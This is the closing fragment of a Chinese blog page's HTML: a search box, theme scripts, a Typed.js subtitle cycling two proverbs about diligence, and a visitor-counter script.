fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function subtitleType () {
  if (true) { 
    window.typed = new Typed("#subtitle", {
      strings: ["应知学问难，在乎点滴勤。尤其难上难，锻炼品德纯。","勤能补拙,天道酬勤"],
      startDelay: 300,
      typeSpeed: 150,
      loop: true,
      backSpeed: 50
    })
  } else {
    document.getElementById("subtitle").innerHTML = '应知学问难，在乎点滴勤。尤其难上难，锻炼品德纯。'
  }
}

if (true) {
  if (typeof Typed === 'function') {
    subtitleType()
  } else {
    getScript('https://cdn.jsdelivr.net/npm/typed.js/lib/typed.min.js').then(subtitleType)
  }
} else {
  subtitleType()
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>